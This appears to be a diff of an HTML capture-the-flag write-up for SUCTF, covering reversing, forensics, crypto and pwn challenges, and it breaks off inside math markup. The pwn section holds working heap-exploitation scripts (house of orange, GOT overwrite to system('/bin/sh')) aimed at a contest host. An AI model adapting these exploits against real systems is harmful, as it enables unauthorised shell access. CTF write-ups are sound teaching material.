-<span data-linenumber="21"></span>
-<span data-linenumber="22"></span>
-<span data-linenumber="23"></span>
-<span data-linenumber="24"></span>
-<span data-linenumber="25"></span>
-<span data-linenumber="26"></span>
-<span data-linenumber="27"></span>
-<span data-linenumber="28"></span>
-<span data-linenumber="29"></span>
-<span data-linenumber="30"></span>
-<span data-linenumber="31"></span>
-<span data-linenumber="32"></span>
-<span data-linenumber="33"></span>
-<span data-linenumber="34"></span>
-<span data-linenumber="35"></span>
-<span data-linenumber="36"></span>
-<span data-linenumber="37"></span></div><div class="code"><span class="hljs-keyword">import</span> re
-<span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *
-<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
-f=open(<span class="hljs-string">"test"</span>)
+print &quot;flag:&quot;,hex(flagc)[2:-1].decode(&quot;hex&quot;)</p>
+<pre class="hljs"><code>### simpleformat (sces60107)
+
+* The binary `simpleformat` use <span class="hljs-built_in">printf</span> format <span class="hljs-built_in">string</span> <span class="hljs-keyword">to</span> verify flag
+* Those format <span class="hljs-built_in">string</span> are mostly in <span class="hljs-keyword">a</span> format like `%<span class="hljs-number">1</span>$*<span class="hljs-number">2</span>$s`. This format <span class="hljs-built_in">string</span> means taking the second <span class="hljs-keyword">argument</span> <span class="hljs-keyword">as</span> the width. 
+* And in the end of <span class="hljs-keyword">all</span> format <span class="hljs-built_in">string</span> <span class="hljs-keyword">is</span> `%<span class="hljs-number">20</span>$n`. This format <span class="hljs-built_in">string</span> will <span class="hljs-built_in">count</span> the <span class="hljs-keyword">number</span> of bytes written <span class="hljs-keyword">so</span> far <span class="hljs-built_in">and</span> stored the value <span class="hljs-keyword">to</span> the <span class="hljs-number">20</span><span class="hljs-keyword">th</span> <span class="hljs-keyword">argument</span>.
+* Actually, Those format strings are some linear equations. We can use `z3` <span class="hljs-keyword">to</span> solve those equations.
+* Scrip<span class="hljs-variable">t:</span>
+```<span class="hljs-keyword">python</span>=
+import re
+from z3 import *
+from pwn import *
+<span class="hljs-keyword">f</span>=<span class="hljs-keyword">open</span>(<span class="hljs-string">"test"</span>)
 ff=[]
-<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> f.readlines():
-  <span class="hljs-keyword">if</span> len(i)&gt;<span class="hljs-number">200</span>:
-    ff.append(i)
+<span class="hljs-keyword">for</span> i in <span class="hljs-keyword">f</span>.readlines():
+  <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(i)&gt;<span class="hljs-number">200</span>:
+    ff.<span class="hljs-keyword">append</span>(i)
 fff=[]
-an=open(<span class="hljs-string">"simpleformat"</span>).read()[<span class="hljs-number">0x27100</span>:<span class="hljs-number">0x27148</span>]
-cc=[]
-<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,<span class="hljs-number">0x48</span>,<span class="hljs-number">4</span>):
-  cc.append(u32(an[i:i+<span class="hljs-number">4</span>]))
+<span class="hljs-keyword">an</span>=<span class="hljs-keyword">open</span>(<span class="hljs-string">"simpleformat"</span>).<span class="hljs-keyword">read</span>()[<span class="hljs-number">0</span>x27100:<span class="hljs-number">0</span>x27148]
+<span class="hljs-keyword">cc</span>=[]
+<span class="hljs-keyword">for</span> i in <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>x48,<span class="hljs-number">4</span>):
+  <span class="hljs-keyword">cc</span>.<span class="hljs-keyword">append</span>(u32(<span class="hljs-keyword">an</span>[i:i+<span class="hljs-number">4</span>]))
 s=Solver()
 flag=[]
-<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">18</span>):
-  flag.append(Int(<span class="hljs-string">"flag"</span>+str(i)))
-c=<span class="hljs-number">0</span>
-<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> ff:
-  k={}
-  <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> re.findall(<span class="hljs-string">"\%1\$\*(..?)\$s"</span>,i):
-    <span class="hljs-keyword">if</span> int(j) <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> k:
-      k[int(j)]=<span class="hljs-number">1</span>
+<span class="hljs-keyword">for</span> i in <span class="hljs-built_in">range</span>(<span class="hljs-number">18</span>):
+  flag.<span class="hljs-keyword">append</span>(Int(<span class="hljs-string">"flag"</span>+str(i)))
+<span class="hljs-keyword">c</span>=<span class="hljs-number">0</span>
+<span class="hljs-keyword">for</span> i in ff:
+  <span class="hljs-keyword">k</span>={}
+  <span class="hljs-keyword">for</span> <span class="hljs-keyword">j</span> in re.findall(<span class="hljs-string">"\%1\$\*(..?)\$s"</span>,i):
+    <span class="hljs-keyword">if</span> <span class="hljs-keyword">int</span>(<span class="hljs-keyword">j</span>) not in <span class="hljs-keyword">k</span>:
+      <span class="hljs-keyword">k</span>[<span class="hljs-keyword">int</span>(<span class="hljs-keyword">j</span>)]=<span class="hljs-number">1</span>
     <span class="hljs-keyword">else</span>:
-      k[int(j)]+=<span class="hljs-number">1</span>
+      <span class="hljs-keyword">k</span>[<span class="hljs-keyword">int</span>(<span class="hljs-keyword">j</span>)]+=<span class="hljs-number">1</span>
   temp=<span class="hljs-number">0</span>
-  <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> k:
-    temp+=flag[j<span class="hljs-number">-2</span>]*k[j]
-  s.add(temp==cc[c])
-  c+=<span class="hljs-number">1</span>
+  <span class="hljs-keyword">for</span> <span class="hljs-keyword">j</span> in <span class="hljs-keyword">k</span>:
+    temp+=flag[<span class="hljs-keyword">j</span>-<span class="hljs-number">2</span>]*<span class="hljs-keyword">k</span>[<span class="hljs-keyword">j</span>]
+  s.<span class="hljs-built_in">add</span>(temp==<span class="hljs-keyword">cc</span>[<span class="hljs-keyword">c</span>])
+  <span class="hljs-keyword">c</span>+=<span class="hljs-number">1</span>
 <span class="hljs-keyword">print</span> s.check()
 flag2=<span class="hljs-string">""</span>
-<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> flag:
-  a=hex(int(str(s.model()[i])))[<span class="hljs-number">2</span>:]
-  a=a.decode(<span class="hljs-string">"hex"</span>)[::<span class="hljs-number">-1</span>]
-  flag2+=a
-<span class="hljs-keyword">print</span> flag2 <span class="hljs-comment">#SUCTF{s1mpl3_prin7f_l1near_f0rmulas}</span>
-</div></div></code></pre><h2 id="misc" style=""><a class="anchor hidden-xs" href="#misc" title="misc"><span class="octicon octicon-link"></span></a>misc</h2><h3 id="TNT-sasdf-bookgin" style=""><a class="anchor hidden-xs" href="#TNT-sasdf-bookgin" title="TNT-sasdf-bookgin"><span class="octicon octicon-link"></span></a>TNT (sasdf, bookgin)</h3><ol>
+<span class="hljs-keyword">for</span> i in fla<span class="hljs-variable">g:</span>
+  <span class="hljs-keyword">a</span>=hex(<span class="hljs-keyword">int</span>(str(s.model()[i])))[<span class="hljs-number">2</span>:]
+  <span class="hljs-keyword">a</span>=<span class="hljs-keyword">a</span>.decode(<span class="hljs-string">"hex"</span>)[::-<span class="hljs-number">1</span>]
+  flag2+=<span class="hljs-keyword">a</span>
+<span class="hljs-keyword">print</span> flag2 #SUCTF{s1mpl3_prin7f_l1near_f0rmulas}</code></pre><h2 id="misc"><a class="header-link" href="#misc"></a>misc</h2>
+<h3 id="tnt-(sasdf,-bookgin)"><a class="header-link" href="#tnt-(sasdf,-bookgin)"></a>TNT (sasdf, bookgin)</h3>
+<ol class="list">
 <li>List all the GET request queries. <code>strings tnt.pcap | grep GET</code></li>
-<li>The blind SQL injection enumerates the table name, column name. We are interested in <code>comment</code> as it’s very long!</li>
-<li>Extract each bytes. The result is like a base64 string.</li>
-</ol><pre><code class="python hljs"><span class="hljs-comment">#!/usr/bin/env python3</span>
+<li>The blind SQL injection enumerates the table name, column name. We are interested in <code>comment</code> as it&#39;s very long!</li>
+<li>Extract each bytes. The result is like a base64 string.<pre class="hljs"><code><span class="hljs-comment">#!/usr/bin/env python3</span>
 <span class="hljs-comment"># Python 3.6.5</span>
 <span class="hljs-keyword">import</span> urllib.parse
 <span class="hljs-keyword">with</span> open(<span class="hljs-string">'./gets'</span>) <span class="hljs-keyword">as</span> f:
-    lines = f.read().strip().split(<span class="hljs-string">'\n'</span>)
-    queries = [urllib.parse.unquote(line.split(<span class="hljs-string">' '</span>)[<span class="hljs-number">1</span>]) <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> lines]
-    <span class="hljs-keyword">for</span> q <span class="hljs-keyword">in</span> queries:                                                                                                                    
-        <span class="hljs-keyword">if</span> <span class="hljs-string">'!='</span> <span class="hljs-keyword">in</span> q <span class="hljs-keyword">and</span> <span class="hljs-string">'comment AS CHAR'</span> <span class="hljs-keyword">in</span> q <span class="hljs-keyword">and</span> <span class="hljs-string">'LIMIT 0'</span><span class="hljs-keyword">in</span> q:
-            print(chr(int(q.split(<span class="hljs-string">'!='</span>)[<span class="hljs-number">-1</span>].split(<span class="hljs-string">')'</span>)[<span class="hljs-number">0</span>])), end=<span class="hljs-string">''</span>)
-</code></pre><ol start="4">
-<li>The hint tells us to remove unnecessary character and append missing one. I remove <code>.</code> and append another <code>=</code> in the end. <code>(cat b64 &amp;&amp; echo '=') | tr -d '.' | base64 -d</code></li>
-<li>The result is a corrputed bzip2 file. Check the <a href="https://www.forensicswiki.org/wiki/Bzip2" target="_blank">bzip2 spec</a> and we found in the end of the file, the CRC only have 30 bits. Therefore, just brute force the 2 bits and padding 6-bit zeros.</li>
-<li>After decompressing bzip2, gz, a corrputed jpg file blocks our way. Taking a closer look, we believe this file is related to zip, because there are some <code>PK</code> in the file, which is part of the <a href="https://en.wikipedia.org/wiki/Zip_(file_format)#File_headers" target="_blank">zip header</a>.</li>
+ lines = f.read().strip().split(<span class="hljs-string">'\n'</span>)
+ queries = [urllib.parse.unquote(line.split(<span class="hljs-string">' '</span>)[<span class="hljs-number">1</span>]) <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> lines]
+ <span class="hljs-keyword">for</span> q <span class="hljs-keyword">in</span> queries:                                                                                                                    
+     <span class="hljs-keyword">if</span> <span class="hljs-string">'!='</span> <span class="hljs-keyword">in</span> q <span class="hljs-keyword">and</span> <span class="hljs-string">'comment AS CHAR'</span> <span class="hljs-keyword">in</span> q <span class="hljs-keyword">and</span> <span class="hljs-string">'LIMIT 0'</span><span class="hljs-keyword">in</span> q:
+         print(chr(int(q.split(<span class="hljs-string">'!='</span>)[<span class="hljs-number">-1</span>].split(<span class="hljs-string">')'</span>)[<span class="hljs-number">0</span>])), end=<span class="hljs-string">''</span>)</code></pre></li>
+<li>The hint tells us to remove unnecessary character and append missing one. I remove <code>.</code> and append another <code>=</code> in the end. <code>(cat b64 &amp;&amp; echo &#39;=&#39;) | tr -d &#39;.&#39; | base64 -d</code></li>
+<li>The result is a corrputed bzip2 file. Check the <a href="https://www.forensicswiki.org/wiki/Bzip2">bzip2 spec</a> and we found in the end of the file, the CRC only have 30 bits. Therefore, just brute force the 2 bits and padding 6-bit zeros.</li>
+<li>After decompressing bzip2, gz, a corrputed jpg file blocks our way. Taking a closer look, we believe this file is related to zip, because there are some <code>PK</code> in the file, which is part of the <a href="https://en.wikipedia.org/wiki/Zip_(file_format">zip header</a>#File_headers).</li>
 <li>However, the Local file header signature is corrupted. Simply patch these bytes and we can go on.</li>
-<li>The next is a file which cannot be recognized by linux <code>file</code>. @bookgin simply guesses some <a href="https://en.wikipedia.org/wiki/List_of_archive_formats" target="_blank">archieve formats</a> and found RAR is the answer. Just patch the header again.</li>
-<li>@sasdf utilizes a more elegant way to solve this: to spot <code>CMT</code> identifier in the file. <code>CMT</code> is the <a href="https://www.rarlab.com/technote.htm#srvcmt" target="_blank">comment identifier</a> in RAR.</li>
+<li>The next is a file which cannot be recognized by linux <code>file</code>. @bookgin simply guesses some <a href="https://en.wikipedia.org/wiki/List_of_archive_formats">archieve formats</a> and found RAR is the answer. Just patch the header again. </li>
+<li>@sasdf utilizes a more elegant way to solve this: to spot <code>CMT</code> identifier in the file. <code>CMT</code> is the <a href="https://www.rarlab.com/technote.htm#srvcmt">comment identifier</a> in RAR. </li>
 <li>We got the flag, finally.</li>
-</ol><h3 id="SandGame-b04902036" style=""><a class="anchor hidden-xs" href="#SandGame-b04902036" title="SandGame-b04902036"><span class="octicon octicon-link"></span></a>SandGame (b04902036)</h3><p>in <code>game.py</code> we can see that it write the reminder of flag module many numbers into sand.txt, so I use <a href="http://comnuan.com/cmnn02/cmnn0200a/" target="_blank">this website</a> to get flag.<br>
-flag : flag{This_is_the_CRT_xwg)}</p><h3 id="Cyclic-b04902036" style=""><a class="anchor hidden-xs" href="#Cyclic-b04902036" title="Cyclic-b04902036"><span class="octicon octicon-link"></span></a>Cyclic (b04902036)</h3><p>in this task it provide a cyclic xored text using flag as the key.<br>
-I first use script provided in <a href="https://ehsandev.com/pico2014/cryptography/repeated_xor.html" target="_blank">here</a> to analyze the key length and figure it to be of 24 bytes. Then use this <a href="https://wiremask.eu/tools/xor-cracker/" target="_blank">online cracker</a> to estimate the key. After decode the provided txt with base64 and uploading the file and see the guessed key of 24 bytes, the output contains some almost readable content : ‘something’. After some trial and error, I got flag(It becomes easy after we know the flag is of 24 bytes and start with ‘something’, just random guess a flag and xor it to the provided file, there will be some recognizable words).<br>
-flag : flag{Something Just Like This}</p><h3 id="Game-b04902036" style=""><a class="anchor hidden-xs" href="#Game-b04902036" title="Game-b04902036"><span class="octicon octicon-link"></span></a>Game (b04902036)</h3><p>there are three type of game in this chal, we have to play each of them 20 turns perfectly. they are<br>
-1.Nim<br>
-2.Wythoff’s game<br>
-3.<a href="http://delphiforfun.org/programs/NIM2_Multi.htm" target="_blank">http://delphiforfun.org/programs/NIM2_Multi.htm</a><br>
-You can easily find optimal algorithmns of playing these games on the internet. My script is realy messy and include many little optimization. Since the connection won’t last more than 90 seconds, it require a good network environment…, I tried near ten times under wired network and finally get flag before the connection timeout.</p><pre><code class="python hljs"><span class="hljs-comment">#!/usr/bin/python</span>
+</ol>
+<h3 id="sandgame-(b04902036)"><a class="header-link" href="#sandgame-(b04902036)"></a>SandGame (b04902036)</h3>
+<p>in <code>game.py</code> we can see that it write the reminder of flag module many numbers into sand.txt, so I use <a href="http://comnuan.com/cmnn02/cmnn0200a/">this website</a> to get flag.
+flag : flag{This_is_the_CRT_xwg)}</p>
+<h3 id="cyclic-(b04902036)"><a class="header-link" href="#cyclic-(b04902036)"></a>Cyclic (b04902036)</h3>
+<p>in this task it provide a cyclic xored text using flag as the key.
+I first use script provided in <a href="https://ehsandev.com/pico2014/cryptography/repeated_xor.html">here</a> to analyze the key length and figure it to be of 24 bytes. Then use this <a href="https://wiremask.eu/tools/xor-cracker/">online cracker</a> to estimate the key. After decode the provided txt with base64 and uploading the file and see the guessed key of 24 bytes, the output contains some almost readable content : &#39;something&#39;. After some trial and error, I got flag(It becomes easy after we know the flag is of 24 bytes and start with &#39;something&#39;, just random guess a flag and xor it to the provided file, there will be some recognizable words).
+flag : flag{Something Just Like This}</p>
+<h3 id="game-(b04902036)"><a class="header-link" href="#game-(b04902036)"></a>Game (b04902036)</h3>
+<p>there are three type of game in this chal, we have to play each of them 20 turns perfectly. they are 
+1.Nim
+2.Wythoff&#39;s game
+3.<a href="http://delphiforfun.org/programs/NIM2_Multi.htm">http://delphiforfun.org/programs/NIM2_Multi.htm</a>
+You can easily find optimal algorithmns of playing these games on the internet. My script is realy messy and include many little optimization. Since the connection won&#39;t last more than 90 seconds, it require a good network environment..., I tried near ten times under wired network and finally get flag before the connection timeout.</p>
+<pre class="hljs"><code><span class="hljs-comment">#!/usr/bin/python</span>
 <span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
 <span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> *
 <span class="hljs-keyword">import</span> string
@@ -535,16 +823,18 @@ GG = <span class="hljs-number">5</span>
         <span class="hljs-keyword">if</span>(sending == <span class="hljs-string">'GG'</span>):
             GG -= <span class="hljs-number">1</span>
             <span class="hljs-keyword">break</span>
-r.interactive()
-</code></pre><p>flag : SUCTF{gGGGGggGgGggGGggGGGggGgGgggGGGGGggggggGgGggggGg}</p><h2 id="pwn" style=""><a class="anchor hidden-xs" href="#pwn" title="pwn"><span class="octicon octicon-link"></span></a>pwn</h2><h3 id="Note-kevin47" style=""><a class="anchor hidden-xs" href="#Note-kevin47" title="Note-kevin47"><span class="octicon octicon-link"></span></a>Note (kevin47)</h3><ul>
+r.interactive()</code></pre><p>flag : SUCTF{gGGGGggGgGggGGggGGGggGgGgggGGGGGggggggGgGggggGg}</p>
+<h2 id="pwn"><a class="header-link" href="#pwn"></a>pwn</h2>
+<h3 id="note-(kevin47)"><a class="header-link" href="#note-(kevin47)"></a>Note (kevin47)</h3>
+<ul class="list">
 <li>Overflow in add</li>
 <li>UAF</li>
-</ul><ol>
-<li>Overflow top chunk’s size to create an unsorted bin</li>
+<li>Overflow top chunk&#39;s size to create an unsorted bin</li>
 <li>Call pandora to create second unsorted bin</li>
 <li>Leak libc and heap</li>
 <li>Use house of orange to get shell</li>
-</ol><pre><code class="python hljs"><span class="hljs-comment">#!/usr/bin/env python2</span>
+</ul>
+<pre class="hljs"><code><span class="hljs-comment">#!/usr/bin/env python2</span>
 
 <span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
 <span class="hljs-keyword">from</span> IPython <span class="hljs-keyword">import</span> embed
@@ -606,14 +896,15 @@ r.sendlineafter(<span class="hljs-string">'Size:'</span>, <span class="hljs-stri
 <span class="hljs-comment">#embed()</span>
 r.interactive()
 
-<span class="hljs-comment"># SUCTF{Me1z1jiu_say_s0rry_LOL}</span>
-</code></pre><h3 id="Heap-b04902036" style=""><a class="anchor hidden-xs" href="#Heap-b04902036" title="Heap-b04902036"><span class="octicon octicon-link"></span></a>Heap (b04902036)</h3><p>there are four functions : creat(length, content), delete(index), show(index) and edit(index, content)<br>
-creat(length, content) : malloc 2 chunk of size “length”, let’s call them a and b, then read “length” bytes into a and strcpy(b, a), free a and store b in a global array heap_form<br>
-delete(index) : free(heap_form[index]), heap_form[index] = NULL<br>
-show(index) : show content of heap_form[index]<br>
-edit(index, content) : write strlen(heap_form[index]) bytes to heap_form[index]<br>
-vulnerability : In function edit(), it allows us to overwrite the size of next chunk, and thus we can perform an unlink, then modify got and get shell.<br>
-I choose to overwrite got of free() since everytime the program read input, it will malloc 8 bytes and free it. So we can input ‘/bin/sh\x00’ after we overwrite the got and get shell.</p><pre><code class="python hljs"><span class="hljs-comment">#!/usr/bin/python</span>
+<span class="hljs-comment"># SUCTF{Me1z1jiu_say_s0rry_LOL}</span></code></pre><h3 id="heap-(b04902036)"><a class="header-link" href="#heap-(b04902036)"></a>Heap (b04902036)</h3>
+<p>there are four functions : creat(length, content), delete(index), show(index) and edit(index, content)
+creat(length, content) : malloc 2 chunk of size &quot;length&quot;, let&#39;s call them a and b, then read &quot;length&quot; bytes into a and strcpy(b, a), free a and store b in a global array heap_form
+delete(index) : free(heap_form[index]), heap_form[index] = NULL
+show(index) : show content of heap_form[index]
+edit(index, content) : write strlen(heap_form[index]) bytes to heap_form[index]
+vulnerability : In function edit(), it allows us to overwrite the size of next chunk, and thus we can perform an unlink, then modify got and get shell.
+I choose to overwrite got of free() since everytime the program read input, it will malloc 8 bytes and free it. So we can input &#39;/bin/sh\x00&#39; after we overwrite the got and get shell.</p>
+<pre class="hljs"><code><span class="hljs-comment">#!/usr/bin/python</span>
 <span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
 host = <span class="hljs-string">'pwn.suctf.asuri.org'</span>
 port = <span class="hljs-number">20004</span>
@@ -674,202 +965,37 @@ real_system = system + libc - free
 edit(<span class="hljs-number">0</span>, p64(real_system)[:<span class="hljs-number">-2</span>], <span class="hljs-number">6</span>)
 r.recvuntil(<span class="hljs-string">'4:edit'</span>)
 r.sendline(<span class="hljs-string">'/bin/sh\x00'</span>)
-r.interactive()
-</code></pre><p>flag : SUCTF{L1gFhAuay4qe29EJrP1MyVWoTGSXJiAzDFdnZLZtTbHKeP2j6bLc}</p><h2 id="crypto" style=""><a class="anchor hidden-xs" href="#crypto" title="crypto"><span class="octicon octicon-link"></span></a>crypto</h2><h3 id="Enjoy-b04902036" style=""><a class="anchor hidden-xs" href="#Enjoy-b04902036" title="Enjoy-b04902036"><span class="octicon octicon-link"></span></a>Enjoy (b04902036)</h3><p>this is a cbc mode aes, we can encrypt and decrypt arbitary text without terminating the process, and the key is equal to iv. With iv == key, we can reconstruct key by the following method</p><ol>
+r.interactive()</code></pre><p>flag : SUCTF{L1gFhAuay4qe29EJrP1MyVWoTGSXJiAzDFdnZLZtTbHKeP2j6bLc}</p>
+<h2 id="crypto"><a class="header-link" href="#crypto"></a>crypto</h2>
+<h3 id="enjoy-(b04902036)"><a class="header-link" href="#enjoy-(b04902036)"></a>Enjoy (b04902036)</h3>
+<p>this is a cbc mode aes, we can encrypt and decrypt arbitary text without terminating the process, and the key is equal to iv. With iv == key, we can reconstruct key by the following method</p>
+<ol class="list">
 <li>generate a 16 bytes text, called C_1</li>
-<li>ask server to decrypt a 48 bytes message, which is (C_1, ‘\X00’ * 16, C_1), and get a 48 bytes pseudo plaintext back, which is (P_1, P_2, P_3)</li>
-<li>key == xor(P_1, P_3)<br>
+<li>ask server to decrypt a 48 bytes message, which is (C_1, &#39;\X00&#39; * 16, C_1), and get a 48 bytes pseudo plaintext back, which is (P_1, P_2, P_3)</li>
+<li>key == xor(P_1, P_3)
 flag : flag{iv=key_is_danger}</li>
-</ol><h3 id="Rsa-good-b04902036" style=""><a class="anchor hidden-xs" href="#Rsa-good-b04902036" title="Rsa-good-b04902036"><span class="octicon octicon-link"></span></a>Rsa good (b04902036)</h3><p>in this chal of RSA, we can</p><ol>
+</ol>
+<h3 id="rsa-good-(b04902036)"><a class="header-link" href="#rsa-good-(b04902036)"></a>Rsa good (b04902036)</h3>
+<p>in this chal of RSA, we can</p>
+<ol class="list">
 <li>encrypt</li>
 <li>decrypt</li>
-<li>get encrypted flag<br>
-We can’t directly decrypt the flag though, instead the server will return ‘permission denied’ or somthing like that.<br>
-However since RSA is malleable, more percisely, let E(x) denote encrypting x, then E(x) = x ^ e (mod n), and we can have that E(x) * E(y) = E(x * y) mod(n).<br>
-now we have E(flag), and we can get E(2), so we ask the server to decrypt E(flag) * E(2) and divide the answer by 2, and get the flag!<br>
+<li>get encrypted flag
+We can&#39;t directly decrypt the flag though, instead the server will return &#39;permission denied&#39; or somthing like that.
+However since RSA is malleable, more percisely, let E(x) denote encrypting x, then E(x) = x ^ e (mod n), and we can have that E(x) <em> E(y) = E(x </em> y) mod(n).
+now we have E(flag), and we can get E(2), so we ask the server to decrypt E(flag) * E(2) and divide the answer by 2, and get the flag!
 flag : SUCTF{Ju5t_hav3_fun_1n_R34_4Ga1N!}</li>
-</ol><h3 id="magic-sasdf" style=""><a class="anchor hidden-xs" href="#magic-sasdf" title="magic-sasdf"><span class="octicon octicon-link"></span></a>magic (sasdf)</h3><p>The hash algorithm in <code>playMagic</code> is <code>sum(bin(magic[i] &amp; key)) % 2</code>, repeating 256 times to generate 256 bit hash. So we have 256 simultaneous equtations of key under Galois field <span class="mathjax"><span class="MathJax_Preview" style="color: inherit; display: none;"></span><span class="MathJax" id="MathJax-Element-1-Frame" tabindex="0" style="position: relative;" data-mathml="<math xmlns=&quot;http://www.w3.org/1998/Math/MathML&quot;><msub><mi>F</mi><mn>2</mn></msub></math>" role="presentation"><nobr aria-hidden="true"><span class="math" id="MathJax-Span-1" style="width: 1.357em; display: inline-block;"><span style="display: inline-block; position: relative; width: 1.094em; height: 0px; font-size: 120%;"><span style="position: absolute; clip: rect(1.351em, 1001.09em, 2.494em, -1000em); top: -2.188em; left: 0em;"><span class="mrow" id="MathJax-Span-2"><span class="msubsup" id="MathJax-Span-3"><span style="display: inline-block; position: relative; width: 1.072em; height: 0px;"><span style="position: absolute; clip: rect(3.174em, 1000.75em, 4.167em, -1000em); top: -4.01em; left: 0em;"><span class="mi" id="MathJax-Span-4" style="font-family: MathJax_Math; font-style: italic;">F<span style="display: inline-block; overflow: hidden; height: 1px; width: 0.106em;"></span></span><span style="display: inline-block; width: 0px; height: 4.01em;"></span></span><span style="position: absolute; top: -3.86em; left: 0.643em;"><span class="mn" id="MathJax-Span-5" style="font-size: 70.7%; font-family: MathJax_Main;">2</span><span style="display: inline-block; width: 0px; height: 4.01em;"></span></span></span></span></span><span style="display: inline-block; width: 0px; height: 2.188em;"></span></span></span><span style="display: inline-block; overflow: hidden; vertical-align: -0.242em; border-left: 0px solid; width: 0px; height: 1.121em;"></span></span></nobr><span class="MJX_Assistive_MathML" role="presentation"><math xmlns="http://www.w3.org/1998/Math/MathML"><msub><mi>F</mi><mn>2</mn></msub></math></span></span><script type="math/tex" id="MathJax-Element-1">F_2</script></span>. Solve the equations by Gaussian elimination to get the flag.</p><h3 id="rsa-sasdf" style=""><a class="anchor hidden-xs" href="#rsa-sasdf" title="rsa-sasdf"><span class="octicon octicon-link"></span></a>rsa (sasdf)</h3><p><span class="mathjax"><span class="MathJax_Preview" style="color: inherit; display: none;"></span><div class="MathJax_Display" style="text-align: center;"><span class="MathJax" id="MathJax-Element-2-Frame" tabindex="0" style="text-align: center; position: relative;" data-mathml="<math xmlns=&quot;http://www.w3.org/1998/Math/MathML&quot; display=&quot;block&quot;><mtable columnalign=&quot;right left right left right left right left right left right left&quot; rowspacing=&quot;3pt&quot; columnspacing=&quot;0em 2em 0em 2em 0em 2em 0em 2em 0em 2em 0em&quot; displaystyle=&quot;true&quot;><mtr><mtd><mi>c</mi></mtd><mtd><mi></mi><mo>=</mo><msup><mi>m</mi><mi>e</mi></msup><mo>&amp;#x00D7;</mo><msup><mi>r</mi><mi>e</mi></msup><mspace width=&quot;1em&quot; /><mi>mod</mi><mspace width=&quot;thinmathspace&quot; /><mspace width=&quot;thinmathspace&quot; /><mi>n</mi></mtd></mtr><mtr><mtd><mi>m</mi></mtd><mtd><mi></mi><mo>=</mo><msup><mi>c</mi><mi>d</mi></msup><mo>&amp;#x00D7;</mo><msup><mi>r</mi><mrow class=&quot;MJX-TeXAtom-ORD&quot;><mo>&amp;#x2212;</mo><mn>1</mn></mrow></msup><mspace width=&quot;1em&quot; /><mi>mod</mi><mspace width=&quot;thinmathspace&quot; /><mspace width=&quot;thinmathspace&quot; /><mi>n</mi></mtd></mtr></mtable></math>" role="presentation"><nobr aria-hidden="true"><span class="math" id="MathJax-Span-6" style="width: 12.294em; display: inline-block;"><span style="display: inline-block; position: relative; width: 10.208em; height: 0px; font-size: 120%;"><span style="position: absolute; clip: rect(0.579em, 1010.02em, 3.296em, -1000em); top: -2.188em; left: 0em;"><span class="mrow" id="MathJax-Span-7"><span class="mtable" id="MathJax-Span-8" style="padding-right: 0.167em; padding-left: 0.167em;"><span style="display: inline-block; position: relative; width: 9.898em; height: 0px;"><span style="position: absolute; clip: rect(2.76em, 1000.86em, 4.929em, -1000em); top: -4.01em; left: 0em;"><span style="display: inline-block; position: relative; width: 0.878em; height: 0px;"><span style="position: absolute; clip: rect(3.412em, 1000.43em, 4.178em, -1000em); top: -4.662em; right: 0em;"><span class="mtd" id="MathJax-Span-9"><span class="mrow" id="MathJax-Span-10"><span class="mi" id="MathJax-Span-11" style="font-family: MathJax_Math; font-style: italic;">c</span></span></span><span style="display: inline-block; width: 0px; height: 4.01em;"></span></span><span style="position: absolute; clip: rect(3.412em, 1000.86em, 4.178em, -1000em); top: -3.259em; right: 0em;"><span class="mtd" id="MathJax-Span-29"><span class="mrow" id="MathJax-Span-30"><span class="mi" id="MathJax-Span-31" style="font-family: MathJax_Math; font-style: italic;">m</span></span></span><span style="display: inline-block; width: 0px; height: 4.01em;"></span></span></span><span style="display: inline-block; width: 0px; height: 4.01em;"></span></span><span style="position: absolute; clip: rect(2.477em, 1009em, 4.929em, -1000em); top: -4.01em; left: 0.878em;"><span style="display: inline-block; position: relative; width: 9.02em; height: 0px;"><span style="position: absolute; clip: rect(3.129em, 1008.83em, 4.178em, -1000em); top: -4.662em; left: 0em;"><span class="mtd" id="MathJax-Span-12"><span class="mrow" id="MathJax-Span-13"><span class="mi" id="MathJax-Span-14"></span><span class="mo" id="MathJax-Span-15" style="font-family: MathJax_Main; padding-left: 0.278em;">=</span><span class="msubsup" id="MathJax-Span-16" style="padding-left: 0.278em;"><span style="display: inline-block; position: relative; width: 1.283em; height: 0px;"><span style="position: absolute; clip: rect(3.412em, 1000.86em, 4.178em, -1000em); top: -4.01em; left: 0em;"><span class="mi" id="MathJax-Span-17" style="font-family: MathJax_Math; font-style: italic;">m</span><span style="display: inline-block; width: 0px; height: 4.01em;"></span></span><span style="position: absolute; top: -4.423em; left: 0.878em;"><span class="mi" id="MathJax-Span-18" style="font-size: 70.7%; font-family: MathJax_Math; font-style: italic;">e</span><span style="display: inline-block; width: 0px; height: 4.01em;"></span></span></span></span><span class="mo" id="MathJax-Span-19" style="font-family: MathJax_Main; padding-left: 0.222em;">×</span><span class="msubsup" id="MathJax-Span-20" style="padding-left: 0.222em;"><span style="display: inline-block; position: relative; width: 0.856em; height: 0px;"><span style="position: absolute; clip: rect(3.412em, 1000.43em, 4.178em, -1000em); top: -4.01em; left: 0em;"><span class="mi" id="MathJax-Span-21" style="font-family: MathJax_Math; font-style: italic;">r</span><span style="display: inline-block; width: 0px; height: 4.01em;"></span></span><span style="position: absolute; top: -4.423em; left: 0.451em;"><span class="mi" id="MathJax-Span-22" style="font-size: 70.7%; font-family: MathJax_Math; font-style: italic;">e</span><span style="display: inline-block; width: 0px; height: 4.01em;"></span></span></span></span><span class="TeXmathchoice" 